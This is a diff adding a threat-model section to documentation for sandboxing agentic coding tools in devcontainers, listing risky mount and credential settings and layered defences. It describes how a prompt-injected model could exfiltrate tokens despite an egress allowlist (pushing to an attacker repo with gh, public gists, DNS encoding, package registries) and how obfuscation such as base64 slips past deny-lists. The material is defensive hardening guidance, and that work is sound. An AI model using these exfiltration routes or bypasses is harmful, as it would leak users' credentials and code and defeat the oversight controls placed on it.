@@ -504,6 +504,137 @@ Limitations and known gaps
   parallel. The linter's drift check enforces sync on non-sandbox keys.
   Adding a key to one without the other is a `make lint` warning.
 
+Threat model and security recommendations
+=========================================
+
+The sandbox + permission system is the *innermost* of several layers.
+Picking the right defaults means understanding all of them and knowing
+which one each control actually protects.
+
+This section is opinionated. As of early 2026 there is no consensus
+best practice for agentic-coding sandboxes; this is the maintainer's
+reading of OWASP LLM Top 10, Anthropic's published threat modeling,
+and adjacent security research, applied to the way this repo is
+actually used.
+
+Outer ring: `devcontainer.json` is the trust root
+-------------------------------------------------
+
+**The most important security control for a devcontainer is what's in
+`devcontainer.json` itself.** Mounts, `runArgs`, env-var forwarding,
+and image/feature pinning decide the blast radius *before* any
+in-container control runs. Egress filtering is the last layer of a
+four-layer onion. A "secure" iptables setup on a devcontainer that
+mounts `docker.sock` is security theater.
+
+Common footguns -- each one bypasses every layer below it:
+
+| In `devcontainer.json`                                                                | Why it's an exfil risk                                                                                                                                       |
+|---------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| `mounts: [..."source=/var/run/docker.sock"...]`                                       | In-container process can spawn sibling containers as `--privileged`, mount host filesystem, exfiltrate the host. Effectively pwns the host.                  |
+| `mounts: [..."source=${localEnv:HOME}/.ssh"...]`                                      | Bind-mounts your private SSH keys into the container. Long-lived. Highest-value cred most developers have.                                                   |
+| SSH agent socket forwarding (mount or `SSH_AUTH_SOCK` env)                            | Container processes can sign anything as you, including pushing to *any* repo your keys can write.                                                           |
+| `mounts` of `~/.aws`, `~/.gnupg`, `~/.azure`, `~/.config/gh`, `~/.config/gcloud`, `~/.kube`, `~/.docker` | Cloud-provider credentials and tool tokens, usually long-lived. Each one bypasses every protection layer below it.                                |
+| `runArgs: ["--privileged"]` or `--cap-add=SYS_ADMIN`                                  | Container can mount host filesystems, manipulate namespaces, escape isolation.                                                                                |
+| `runArgs: ["--security-opt=seccomp=unconfined"]`                                      | Lifts the seccomp filter that blocks ~50 dangerous syscalls. Combined with capability adds, gets bad fast.                                                    |
+| `containerEnv` / `remoteEnv` forwarding `${localEnv:AWS_*}`, `GH_TOKEN`, `ANTHROPIC_API_KEY`, `NPM_TOKEN`, `OPENAI_API_KEY` | Forwards host secrets as env vars. Visible in `/proc/PID/environ`, inherited by every subprocess.                                       |
+| Unpinned `image` (no `@sha256:...`) like `:debian` or `:latest`                       | The image you build on can change under you; a compromised upstream lands in your dev environment.                                                            |
+| Unpinned `features: { "ghcr.io/.../docker-in-docker:1": {} }`                         | Each feature is arbitrary code from an OCI registry executed during build with elevated privileges. Pin to digest.                                            |
+| `forwardPorts` bound to `0.0.0.0`                                                     | Container services exposed on all interfaces, including hostile networks.                                                                                     |
+| `postCreateCommand: "curl ... \| bash"`                                               | Pulls and executes arbitrary code at build time. Trust chain depends on the upstream URL.                                                                     |
+
+This is exactly the surface [`bin/dc-audit.sh`](../bin/dc-audit.sh)
+audits. Run it against your project's `devcontainer.json` *before*
+worrying about egress filtering. For hardened profiles, pass `--strict`
+to fail on any warning:
+
+```bash
+bin/dc-audit.sh --strict --profile unattended .devcontainer/your-profile/devcontainer.json
+```
+
+Inner ring: what lives in the container that the model could exfil
+------------------------------------------------------------------
+
+A common intuition trap is "the creds are on the host; the container
+can't reach them." That's only half right. Excluded by this repo's
+design: host `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.azure`, `~/.config/gcloud`,
+`~/.kube`, `~/.docker`. The dc-audit rubric blocks bind-mounting them.
+
+**Inside** the container, in the persisted state volume, you typically have:
+
+- **`~/.config/gh/`** -- the GitHub CLI's stored auth. Usually a
+  long-lived classic PAT or OAuth user-to-server token. **The
+  highest-value in-container cred for most developers.** It can push
+  code to any repo it has write access to, read all private repos it
+  can read, and call the GitHub API with your identity.
+- **`~/.claude/`**, **`~/.codex/`**, **`~/.copilot/`** -- OAuth /
+  session tokens for the agentic CLIs. Attacker with these can run
+  Claude / Codex / Copilot as you, see your conversations, accrue
+  charges to your account.
+- **Atuin shell history** -- can include sensitive command output
+  fragments depending on what you ran.
+- **Forwarded env vars** (`containerEnv` / `remoteEnv`) -- visible to
+  every process in the container via `/proc/PID/environ`.
+- **Workspace source code** -- whether that matters is project-specific.
+
+For unattended profiles specifically, prefer fine-grained,
+single-repo, short-lived GitHub tokens (`GH_TOKEN_UNATTENDED`) over
+the omnibus token `gh auth login` writes. The unattended profile
+already does this.
+
+The four protective layers, outer to inner
+------------------------------------------
+
+| Layer                                                                  | Protects against                                                          | Bypassable how                                                                                                                                                  |
+|------------------------------------------------------------------------|---------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| **Hardened `devcontainer.json`** (run `bin/dc-audit.sh`)               | The worst exfil vectors before they exist                                 | If you skip dc-audit and leave `docker.sock` mounted, every layer below is moot                                                                                |
+| **Container boundary**                                                 | Compromise of the *host* from inside the container                        | Doesn't protect the container's *own* contents                                                                                                                  |
+| **Claude Code `permissions.deny[]` + `pre-security.sh` hook**          | Direct cred reads (`Read(~/.config/gh/**)`) and dangerous bash via Claude | Creative obfuscation (`xxd`, `base64`); indirect access via tools the model is allowed to use (`gh api`, `git push`)                                            |
+| **Egress allowlist** (iptables, opt-in via `DOTFILES_DEVCONTAINER_EGRESS=1`) | Exfil to *attacker-controlled* domains                                  | Allowed domains can be misused (see "residual exfil paths" below); also see existing [`Iptables and DNS-based exfil`](#limitations-and-known-gaps) limitation |
+
+Residual exfil paths even with all four layers tight
+----------------------------------------------------
+
+The allowlist narrows the channel; it does not close it. A prompt-injected
+model with read access to your GH token and bash access can still:
+
+- `gh repo create attacker/exfil --private && git push` -- `github.com`
+  is on the allowlist; the token has write access; you cannot tell
+  legitimate pushes from exfil pushes at the network layer.
+- `gh api -X POST /gists` posting source to a public gist.
+- DNS exfiltration -- DNS is open; encode data in subdomain lookups.
+- `npm publish` / `pypi upload` / `docker push` -- any allowed registry
+  that accepts user-uploaded artifacts.
+
+This is the central reason **the outer layers matter more than the
+egress allowlist**: limit credential scope and you limit blast radius
+even when the model is hijacked.
+
+Opinionated recommendation by user profile
+-------------------------------------------
+
+| Profile                                  | Devcontainer.json   | Deny-list + hook | Egress allowlist                                                  | Notes                                                                                                                                                                                                                                                                |
+|------------------------------------------|---------------------|------------------|-------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| **Hobbyist / personal projects**         | dc-audit clean      | on (default)     | **skip**                                                          | Container boundary + permissions + human-in-the-loop are enough. The allowlist breaks WebFetch research and the residual exfil paths survive it anyway. The friction isn't worth the marginal protection.                                                            |
+| **Sensitive code or production-grade tokens** | dc-audit `--strict` | on (default) | **on**                                                            | Enable `DOTFILES_DEVCONTAINER_EGRESS=1` + `--cap-add=NET_ADMIN`. Expect to add research domains via `DOTFILES_EGRESS_EXTRA_HOSTS=...` in `remoteEnv`. Consider scoping the GitHub token to specific repos.                                                            |
+| **Unattended / agentic loops**           | use `.devcontainer/unattended/` as reference | on (default) | replaced by mitmproxy in the unattended profile             | The unattended profile demonstrates all four layers done right: no `~/.ssh`, no `docker.sock`, pinned image, `--cap-drop=ALL`, `--security-opt=no-new-privileges`, short-lived `GH_TOKEN_UNATTENDED`, mitmproxy egress with audit log. Crib from it; don't rebuild. |
+
+Industry context
+----------------
+
+There is no settled best practice for agentic-coding sandboxes as of
+early 2026. The defensive playbook from OWASP LLM Top 10, Anthropic's
+published threat modeling, and adjacent sources:
+
+1. Containerize. (This repo does.)
+2. Limit credential scope -- fine-grained, single-repo, short-lived
+   tokens where possible.
+3. Approval-required for destructive operations (pre-security hook +
+   deny-list).
+4. Egress allowlist for high-stakes / unattended work; relaxed for
+   interactive everyday work where the user is in the loop.
+5. Audit logging (the unattended profile's mitmproxy log).
+
 CVEs and updates
 ================
 
